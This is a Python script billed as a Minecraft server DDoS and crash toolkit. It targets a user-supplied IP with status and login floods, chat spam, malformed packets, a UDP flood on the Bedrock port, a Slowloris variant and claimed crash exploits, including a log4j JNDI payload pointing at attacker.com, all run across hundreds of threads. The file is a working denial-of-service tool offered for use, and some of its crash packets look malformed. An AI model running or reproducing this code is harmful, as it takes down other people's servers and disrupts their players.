#!/usr/bin/env python3
"""
Minecraft Server DDoS & Crash Attack Toolkit
Targets: All Minecraft versions (Java & Bedrock)
"""

import socket
import threading
import random
import time
import struct
import json
import sys
import os
from concurrent.futures import ThreadPoolExecutor

# ========== បន្ថែមពណ៌ត្រង់នេះ ==========
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[35m'
    WHITE = '\033[97m'
    BLACK = '\033[30m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    
    # Background colors
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'

class MinecraftDDoS:
    def __init__(self, target_ip, target_port=25565):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = True
        self.protocol_version = 758  # Minecraft 1.18.2
        self.attack_methods = {}
        
    def handshake_packet(self, next_state=1):
        """Create Minecraft handshake packet"""
        # Packet ID: 0x00 for handshake
        data = b''
        
        # Protocol version (varint)
        data += self.encode_varint(self.protocol_version)
        
        # Server address (string)
        data += self.encode_string(self.target_ip)
        
        # Server port (unsigned short)
        data += struct.pack('>H', self.target_port)
        
        # Next state (varint): 1 for status, 2 for login
        data += self.encode_varint(next_state)
        
        # Prepend packet length and ID
        packet_length = self.encode_varint(len(data) + 1)  # +1 for packet ID
        packet_id = self.encode_varint(0x00)  # Handshake packet ID
        
        return packet_length + packet_id + data
    
    def status_request_packet(self):
        """Create status request packet"""
        # Packet ID: 0x00 for status request
        packet_id = self.encode_varint(0x00)
        
        # Prepend packet length
        packet_length = self.encode_varint(len(packet_id))
        
        return packet_length + packet_id
    
    def login_start_packet(self, username="Bot"):
        """Create login start packet"""
        # Packet ID: 0x00 for login start
        packet_id = self.encode_varint(0x00)
        
        # Username (string)
        username_data = self.encode_string(username)
        
        # UUID (optional, not included)
        
        return packet_id + username_data
    
    def encode_varint(self, value):
        """Encode integer as VarInt"""
        data = b''
        while True:
            temp = value & 0x7F
            value >>= 7
            if value != 0:
                temp |= 0x80
            data += bytes([temp])
            if value == 0:
                break
        return data
    
    def encode_string(self, string):
        """Encode string for Minecraft protocol"""
        encoded = string.encode('utf-8')
        return self.encode_varint(len(encoded)) + encoded
    
    def method1_status_flood(self):
        """Status request flood - overwhelms server with status queries"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.target_port))
                
                # Send handshake (state=1 for status)
                sock.send(self.handshake_packet(next_state=1))
                
                # Send status request
                sock.send(self.status_request_packet())
                
                # Request ping
                ping_packet = self.encode_varint(0x01)  # Ping packet ID
                ping_packet += struct.pack('>Q', int(time.time() * 1000))  # Payload
                sock.send(self.encode_varint(len(ping_packet)) + ping_packet)
                
                # Keep connection open
                time.sleep(0.1)
                sock.close()
                
                # បង្ហាញសកម្មភាពជាពណ៌
                print(f"{Colors.CYAN}[Status Flood]{Colors.END} Packet sent to {self.target_ip}")
                
            except Exception as e:
                pass
    
    def method2_login_flood(self):
        """Login request flood - overwhelms login handler"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.target_port))
                
                # Send handshake (state=2 for login)
                sock.send(self.handshake_packet(next_state=2))
                
                # Send login start with random username
                username = f"Bot_{random.randint(1000, 9999)}"
                login_packet = self.login_start_packet(username)
                sock.send(self.encode_varint(len(login_packet)) + login_packet)
                
                # Send keep alive to maintain connection
                keep_alive_id = random.randint(1, 1000000)
                keep_alive = self.encode_varint(0x21)  # Keep alive packet ID
                keep_alive += self.encode_varint(keep_alive_id)
                sock.send(self.encode_varint(len(keep_alive)) + keep_alive)
                
                # Keep connection alive
                for _ in range(10):
                    time.sleep(0.5)
                    sock.send(b'\x00')  # Null packet
                
                sock.close()
                
                # បង្ហាញសកម្មភាពជាពណ៌
                print(f"{Colors.YELLOW}[Login Flood]{Colors.END} Login attempt with {Colors.GREEN}{username}{Colors.END}")
                
            except Exception as e:
                pass
    
    def method3_chat_spam(self):
        """Chat message flood - overwhelms chat handler"""
        print(f"{Colors.MAGENTA}[Chat Spam]{Colors.END} Starting chat spam...")
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.target_port))
                
                # Send handshake (state=2 for login)
                sock.send(self.handshake_packet(next_state=2))
                
                # Login start
                username = f"ChatBot_{random.randint(1000, 9999)}"
                login_packet = self.login_start_packet(username)
                sock.send(self.encode_varint(len(login_packet)) + login_packet)
                
                # Send multiple chat messages
                for i in range(20):
                    chat_message = f"Spam message {random.randint(1, 1000000)}"
                    chat_packet = self.create_chat_packet(chat_message)
                    try:
                        sock.send(chat_packet)
                        print(f"{Colors.BLUE}[Chat]{Colors.END} {chat_message}")
                    except:
                        break
                    time.sleep(0.05)
                
                sock.close()
                
            except Exception as e:
                pass
    
    def create_chat_packet(self, message):
        """Create chat packet"""
        # Chat packet ID: 0x03
        packet_id = self.encode_varint(0x03)
        
        # Message (string)
        message_data = self.encode_string(message)
        
        # Position (byte): 0 = chat
        position = b'\x00'
        
        # Sender (UUID) - optional
        sender = b'\x00' * 16
        
        packet = packet_id + message_data + position + sender
        return self.encode_varint(len(packet)) + packet
    
    def method4_invalid_packets(self):
        """Send malformed/invalid packets to crash server"""
        invalid_packets = [
            b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff',  # Extremely large packet length
            b'\x00' * 1000,  # Null bytes
            b'\xff' * 500,   # Max bytes
            struct.pack('>I', 0xFFFFFFFF) + b'A' * 10000,  # Large packet
            b'\x80\x80\x80\x80\x80\x00',  # Invalid varint
            b'\x00\x00\x00\x01\x08' + b'\x41' * 1000000,  # Huge string
        ]
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, self.target_port))
                
                # Send multiple invalid packets
                packet_count = 0
                for packet in invalid_packets:
                    for _ in range(10):
                        try:
                            sock.send(packet)
                            packet_count += 1
                            time.sleep(0.01)
                        except:
                            break
                
                sock.close()
                print(f"{Colors.RED}[Invalid Packets]{Colors.END} Sent {packet_count} malformed packets")
                
            except Exception as e:
                pass
    
    def method5_udp_flood(self):
        """UDP flood for Minecraft Bedrock/Pocket Edition"""
        # Minecraft Bedrock uses UDP port 19132
        bedrock_port = 19132
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Unconnected ping packet for Minecraft Bedrock
        packet = bytearray()
        packet.extend([0x01])  # Packet ID (Unconnected Ping)
        packet.extend([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])  # Ping ID
        packet.extend([0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE, 0xFE, 0xFD, 0xFD, 0xFD, 0xFD,
                      0x12, 0x34, 0x56, 0x78])  # Magic bytes
        packet.extend(struct.pack('>Q', int(time.time() * 1000)))  # Client timestamp
        
        udp_count = 0
        while self.running:
            try:
                # Send to both Java and Bedrock ports
                sock.sendto(packet, (self.target_ip, bedrock_port))
                sock.sendto(packet, (self.target_ip, self.target_port))
                
                # Also send random garbage
                sock.sendto(os.urandom(1024), (self.target_ip, bedrock_port))
                sock.sendto(os.urandom(1024), (self.target_ip, self.target_port))
                
                udp_count += 4
                if udp_count % 100 == 0:
                    print(f"{Colors.MAGENTA}[UDP Flood]{Colors.END} Sent {udp_count} UDP packets")
                
            except Exception as e:
                pass
    
    def method6_slowloris_mc(self):
        """Minecraft Slowloris - keep many connections open"""
        print(f"{Colors.YELLOW}[Slowloris]{Colors.END} Starting Slowloris attack...")
        
        sockets = []
        
        while self.running and len(sockets) < 1000:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.target_ip, self.target_port))
                
                # Send partial handshake
                partial_handshake = self.handshake_packet()[:10]  # First 10 bytes only
                sock.send(partial_handshake)
                
                sockets.append(sock)
                
                print(f"\r{Colors.CYAN}[Slowloris]{Colors.END} Connections: {Colors.GREEN}{len(sockets)}{Colors.END}", end="")
                
            except Exception as e:
                pass
            
            # Keep connections alive by sending bytes slowly
            for sock in sockets[:]:
                try:
                    sock.send(b'\x00')
                except:
                    sockets.remove(sock)
            
            time.sleep(5)  # Send keepalive every 5 seconds
        
        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    def method7_exploit_crash(self):
        """Exploit known Minecraft server crashes"""
        print(f"{Colors.RED}[Crash Exploits]{Colors.END} Attempting crash exploits...")
        
        # CVE-2021-44228 log4j exploit (if server uses vulnerable version)
        log4j_payload = "${jndi:ldap://attacker.com/exploit}"
        
        # Various crash packets for different versions
        crash_packets = [
            # 1.12.2 chunk loading crash
            b'\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff',
            
            # Invalid NBT data crash
            b'\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x0a\xff\xff\xff\xff',
            
            # Book ban crash (large book with pages)
            self.create_crash_book(),
            
            # Sign text overflow
            self.create_crash_sign(),
            
            # Inventory click crash
            b'\x07\xff\xff\xff\xff\xff\xff\xff\xff\xff',
        ]
        
        exploit_count = 0
        for packet in crash_packets:
            for _ in range(10):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target_ip, self.target_port))
                    sock.send(packet)
                    sock.close()
                    exploit_count += 1
                    time.sleep(0.1)
                except:
                    pass
        
        print(f"{Colors.RED}[Crash Exploits]{Colors.END} Sent {exploit_count} exploit packets")
    
    def create_crash_book(self):
        """Create crash book packet"""
        # Packet for sending malformed book
        packet = bytearray()
        
        # Creative inventory action packet (0x2B)
        packet.extend([0x2B])
        
        # Slot (varint) - 0 for main hand
        packet.extend(self.encode_varint(0))
        
        # Create NBT data for book with huge pages
        nbt_data = bytearray()
        
        # NBT compound tag
        nbt_data.extend([0x0A])  # TAG_Compound
        
        # Add huge string as pages
        for i in range(50):  # 50 pages
            page_text = "A" * 32767  # Max string length
            nbt_data.extend([0x08])  # TAG_String
            nbt_data.extend(f"page{i}".encode('utf-8'))
            nbt_data.extend(struct.pack('>H', len(page_text)))
            nbt_data.extend(page_text.encode('utf-8'))
        
        nbt_data.extend([0x00])  # TAG_End
        
        packet.extend(nbt_data)
        
        return bytes(packet)
    
    def create_crash_sign(self):
        """Create crash sign packet"""
        # Update sign packet (0x2A)
        packet = bytearray([0x2A])
        
        # Position (3 ints)
        packet.extend(struct.pack('>i', 0))
        packet.extend(struct.pack('>i', 100))
        packet.extend(struct.pack('>i', 0))
        
        # Four lines of text (strings)
        for _ in range(4):
            line = "A" * 1000  # Very long line
            packet.extend(struct.pack('>H', len(line)))
            packet.extend(line.encode('utf-8'))
        
        return bytes(packet)
    
    def run_all_attacks(self, duration=300, threads=500):
        """Run all attack methods simultaneously"""
        print(f"\n{Colors.BOLD}{Colors.HEADER}{'='*60}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.RED}    MINECRAFT DDOS ATTACK TOOLKIT{Colors.END}")
        print(f"{Colors.BOLD}{Colors.HEADER}{'='*60}{Colors.END}\n")
        
        print(f"{Colors.BOLD}{Colors.CYAN}[TARGET]{Colors.END} {Colors.YELLOW}{self.target_ip}:{self.target_port}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}[DURATION]{Colors.END} {Colors.YELLOW}{duration} seconds{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}[THREADS]{Colors.END} {Colors.YELLOW}{threads}{Colors.END}\n")
        
        print(f"{Colors.BOLD}{Colors.GREEN}[ATTACK METHODS]{Colors.END}")
        methods_list = [
            "1. Status request flood",
            "2. Login flood", 
            "3. Chat spam",
            "4. Invalid packets",
            "5. UDP flood (Bedrock)",
            "6. Slowloris",
            "7. Crash exploits"
        ]
        
        for method in methods_list:
            print(f"  {Colors.MAGENTA}▶{Colors.END} {method}")
        
        print(f"\n{Colors.BOLD}{Colors.YELLOW}[STATUS]{Colors.END} Attack started at {time.strftime('%H:%M:%S')}\n")
        print(f"{Colors.BOLD}{Colors.HEADER}{'-'*60}{Colors.END}\n")
        
        self.running = True
        start_time = time.time()
        
        # List of all methods to call
        methods = [
            self.method1_status_flood,
            self.method2_login_flood,
            self.method3_chat_spam,
            self.method4_invalid_packets,
            self.method5_udp_flood,
            self.method6_slowloris_mc,
            self.method7_exploit_crash
        ]
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            # Distribute threads to each method
            for _ in range(threads // len(methods)):
                for method in methods:
                    executor.submit(method)
            
            # Run for specified duration
            while time.time() - start_time < duration:
                elapsed = int(time.time() - start_time)
                remaining = duration - elapsed
                
                # Create progress bar
                bar_length = 30
                filled = int(bar_length * elapsed / duration)
                bar = f"{Colors.GREEN}{'█' * filled}{Colors.WHITE}{'░' * (bar_length - filled)}{Colors.END}"
                
                print(f"\r{Colors.BOLD}[{bar}{Colors.BOLD}] {Colors.CYAN}{elapsed}/{duration}s{Colors.END} {Colors.YELLOW}({remaining}s remaining){Colors.END}", end="")
                time.sleep(1)
            
            self.running = False
        
        print(f"\n\n{Colors.BOLD}{Colors.GREEN}[✓]{Colors.END} Attack completed at {time.strftime('%H:%M:%S')}")
        print(f"{Colors.BOLD}{Colors.HEADER}{'='*60}{Colors.END}\n")

# Main execution
def main():
    # Colorful banner
    banner = f"""
{Colors.RED}{Colors.BOLD}

                    
                    ██████╗  ██████╗ ███╗   ██╗██╗ ██████╗
                    ██╔════╝ ██╔═══██╗████╗  ██║██║██╔════╝
                    ███████╗ ██║   ██║██╔██╗ ██║██║██║     
                    ╚════██║ ██║   ██║██║╚██╗██║██║██║     
                    ███████║ ╚██████╔╝██║ ╚████║██║╚██████╗
                    ╚══════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝ ╚═════╝| 
                              
{Colors.END}
{Colors.CYAN}{Colors.BOLD}
    ███████╗██████╗ ██╗   ██╗███████╗██████╗  ██████╗███████╗███████╗███████╗
    ██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝
    ███████╗██████╔╝██║   ██║█████╗  ██████╔╝██║     █████╗  ███████╗███████╗
    ╚════██║██╔═══╝ ██║   ██║██╔══╝  ██╔══██╗██║     ██╔══╝  ╚════██║╚════██║
    ███████║██║     ╚██████╔╝███████╗██║  ██║╚██████╗███████╗███████║███████║
    ╚══════╝╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚══════╝╚══════╝
{Colors.END}
{Colors.YELLOW}{Colors.BOLD}                          MINECRAFT DDOS ATTACK TOOLKIT BY Steven.Kh{Colors.END}
{Colors.MAGENTA}{Colors.BOLD}                      TARGETS: JAVA & BEDROCK EDITIONS{Colors.END}
    """
    
    print(banner)
    
    # If no arguments, use default values or ask user
    if len(sys.argv) < 2:
        print(f"{Colors.YELLOW}[!]{Colors.END} No target specified.")
        print(f"{Colors.CYAN}[?]{Colors.END} Choose an option:")
        print(f"  {Colors.GREEN}1.{Colors.END} Enter target manually")
        print(f"  {Colors.GREEN}2.{Colors.END} Run test mode (localhost)")
        print(f"  {Colors.GREEN}3.{Colors.END} Exit")
        
        choice = input(f"\n{Colors.BOLD}{Colors.MAGENTA}Enter choice (1-3):{Colors.END} ")
        
        if choice == "1":
            target_ip = input(f"{Colors.CYAN}Enter target IP:{Colors.END} ")
            target_port = int(input(f"{Colors.CYAN}Enter port (default 25565):{Colors.END} ") or "25565")
            duration = int(input(f"{Colors.CYAN}Enter duration in seconds (default 60):{Colors.END} ") or "60")
            threads = int(input(f"{Colors.CYAN}Enter threads (default 100):{Colors.END} ") or "100")
        elif choice == "2":
            print(f"{Colors.YELLOW}[i]{Colors.END} Running test mode on localhost...")
            target_ip = "127.0.0.1"
            target_port = 25565
            duration = 30
            threads = 50
        else:
            print(f"{Colors.RED}[!]{Colors.END} Exiting...")
            sys.exit(0)
    else:
        target_ip = sys.argv[1]
        target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 25565
        duration = int(sys.argv[3]) if len(sys.argv) > 3 else 300
        threads = int(sys.argv[4]) if len(sys.argv) > 4 else 500
    
    print(f"\n{Colors.GREEN}[✓]{Colors.END} Configuration loaded")
    print(f"{Colors.YELLOW}[!]{Colors.END} Starting attack in 3 seconds... Press Ctrl+C to cancel")
    
    try:
        for i in range(3, 0, -1):
            print(f"{Colors.RED}{i}{Colors.END}...", end=" ", flush=True)
            time.sleep(1)
        print(f"{Colors.GREEN}GO!{Colors.END}\n")
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!]{Colors.END} Attack cancelled")
        sys.exit(0)
    
    attacker = MinecraftDDoS(target_ip, target_port)
    
    try:
        attacker.run_all_attacks(duration, threads)
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!]{Colors.END} Attack stopped by user")
        attacker.running = False
    except Exception as e:
        print(f"\n\n{Colors.RED}[!]{Colors.END} Error: {e}")
        attacker.running = False

if __name__ == "__main__":
    main()